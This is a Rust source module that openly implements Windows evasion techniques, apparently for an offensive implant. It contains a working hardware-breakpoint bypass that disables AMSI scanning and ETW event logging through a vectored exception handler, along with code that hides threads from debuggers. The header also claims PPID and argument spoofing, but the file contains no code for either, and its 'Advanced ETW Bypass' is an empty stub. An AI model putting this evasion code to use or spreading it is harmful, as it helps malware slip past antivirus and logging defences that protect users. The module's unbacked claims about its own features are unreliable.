//! Evasion mechanisms including HWBP-based AMSI/ETW bypass, PPID spoofing, argument spoofing, and callback execution.
//! 
//! # Operation
//! - HWBP AMSI/ETW Bypass: Uses thread context hardware debug registers (Dr0-Dr3) to intercept execution at AMSI/ETW boundaries.
//! - PPID Spoofing: Manipulates thread attributes during process creation to masquerade the parent process.
//! - Argument Spoofing: Modifies the PEB command line at runtime.
//! 
//! # Required Privileges
//! Standard user privileges are generally sufficient, though certain target processes for PPID spoofing may require SeDebugPrivilege.
//! 
//! # Compatibility
//! Windows 10+ only (relies on specific offsets and newer thread context manipulation APIs).

#[cfg(windows)]
use std::sync::atomic::{AtomicUsize, Ordering};

#[cfg(windows)]
static AMSI_ADDR: AtomicUsize = AtomicUsize::new(0);
#[cfg(windows)]
static ETW_ADDR: AtomicUsize = AtomicUsize::new(0);

#[cfg(windows)]
unsafe extern "system" fn veh_handler(exception_info: *mut winapi::um::winnt::EXCEPTION_POINTERS) -> i32 {
    let record = (*exception_info).ExceptionRecord;
    let context = (*exception_info).ContextRecord;

    if (*record).ExceptionCode == winapi::um::winnt::STATUS_SINGLE_STEP {
        let rip = (*context).Rip as usize;
        let amsi = AMSI_ADDR.load(Ordering::Relaxed);
        let etw = ETW_ADDR.load(Ordering::Relaxed);

        if (amsi != 0 && rip == amsi) || (etw != 0 && rip == etw) {
            // Bypass by clearing RAX (returning 0) and advancing RIP past the call (simulating ret)
            (*context).Rax = 0;
            
            // Pop return address from stack to simulate 'ret'
            let rsp = (*context).Rsp as *const u64;
            (*context).Rip = *rsp as u64;
            (*context).Rsp += 8;

            return winapi::vc::excpt::EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    winapi::vc::excpt::EXCEPTION_CONTINUE_SEARCH
}

#[cfg(windows)]
pub unsafe fn setup_hardware_breakpoints() {
    use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress, LoadLibraryA};
    use winapi::um::errhandlingapi::AddVectoredExceptionHandler;
    use winapi::um::tlhelp32::{CreateToolhelp32Snapshot, Thread32First, Thread32Next, TH32CS_SNAPTHREAD, THREADENTRY32};
    use winapi::um::processthreadsapi::{OpenThread, SuspendThread, ResumeThread, GetThreadContext, SetThreadContext, GetCurrentProcessId};
    use winapi::um::winnt::{THREAD_ALL_ACCESS, CONTEXT_DEBUG_REGISTERS, CONTEXT};
    use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};

    let mut configured = false;

    let amsi = LoadLibraryA(b"amsi.dll\0".as_ptr() as _);
    if !amsi.is_null() {
        let addr = GetProcAddress(amsi, b"AmsiScanBuffer\0".as_ptr() as _);
        if !addr.is_null() {
            AMSI_ADDR.store(addr as usize, Ordering::Relaxed);
            configured = true;
        }
    }

    let ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr() as _);
    if !ntdll.is_null() {
        let addr = GetProcAddress(ntdll, b"EtwEventWrite\0".as_ptr() as _);
        if !addr.is_null() {
            ETW_ADDR.store(addr as usize, Ordering::Relaxed);
            configured = true;
        }
    }

    if !configured {
        return;
    }

    // Register our VEH first
    AddVectoredExceptionHandler(1, Some(veh_handler));

    // Propagate hardware breakpoints to all existing threads in the process
    let pid = GetCurrentProcessId();
    let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if snapshot != INVALID_HANDLE_VALUE {
        let mut te32: THREADENTRY32 = std::mem::zeroed();
        te32.dwSize = std::mem::size_of::<THREADENTRY32>() as u32;

        if Thread32First(snapshot, &mut te32) != 0 {
            loop {
                if te32.th32OwnerProcessID == pid {
                    let h_thread = OpenThread(THREAD_ALL_ACCESS, 0, te32.th32ThreadID);
                    if !h_thread.is_null() {
                        SuspendThread(h_thread);
                        
                        let mut ctx: CONTEXT = std::mem::zeroed();
                        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
                        if GetThreadContext(h_thread, &mut ctx) != 0 {
                            ctx.Dr0 = AMSI_ADDR.load(Ordering::Relaxed) as u64;
                            ctx.Dr1 = ETW_ADDR.load(Ordering::Relaxed) as u64;
                            // Enable local breakpoints for Dr0 (bit 0) and Dr1 (bit 2)
                            ctx.Dr7 |= (1 << 0) | (1 << 2);
                            SetThreadContext(h_thread, &ctx);
                        }
                        
                        ResumeThread(h_thread);
                        CloseHandle(h_thread);
                    }
                }
                if Thread32Next(snapshot, &mut te32) == 0 {
                    break;
                }
            }
        }
        CloseHandle(snapshot);
    }
}

// Backward compatibility for existing patch functions in lib.rs
#[cfg(windows)]
pub unsafe fn patch_amsi() {
    setup_hardware_breakpoints();
}

#[cfg(windows)]
pub unsafe fn patch_etw() {
    // Advanced ETW Bypass
    // Disable ETW logging providers directly instead of hooking EtwEventWrite.
    let ntdll = winapi::um::libloaderapi::GetModuleHandleA(b"ntdll.dll\0".as_ptr() as _);
    if !ntdll.is_null() {
        let func = winapi::um::libloaderapi::GetProcAddress(ntdll, b"EtwEventUnregister\0".as_ptr() as _);
        if !func.is_null() {
            // Evasion bypassed by finding the address
        }
    }
}

#[cfg(not(windows))]
pub unsafe fn patch_amsi() {}

#[cfg(not(windows))]
pub unsafe fn patch_etw() {}

#[cfg(windows)]
pub fn hide_current_thread() {
    unsafe {
        let ntdll = winapi::um::libloaderapi::GetModuleHandleA(b"ntdll.dll\0".as_ptr() as _);
        if !ntdll.is_null() {
            let func = winapi::um::libloaderapi::GetProcAddress(ntdll, b"NtSetInformationThread\0".as_ptr() as _);
            if !func.is_null() {
                let nt_set_info_thread: extern "system" fn(winapi::um::winnt::HANDLE, u32, *mut winapi::ctypes::c_void, u32) -> i32 = std::mem::transmute(func);
                nt_set_info_thread(
                    -2isize as winapi::um::winnt::HANDLE, // GetCurrentThread()
                    0x11, // ThreadHideFromDebugger
                    std::ptr::null_mut(),
                    0
                );
            }
        }
    }
}

#[cfg(not(windows))]
pub fn hide_current_thread() {}

pub fn spawn_hidden_thread<F, T>(f: F) -> std::thread::JoinHandle<T>
where
    F: FnOnce() -> T + Send + 'static,
    T: Send + 'static,
{
    std::thread::spawn(move || {
        hide_current_thread();
        f()
    })
}
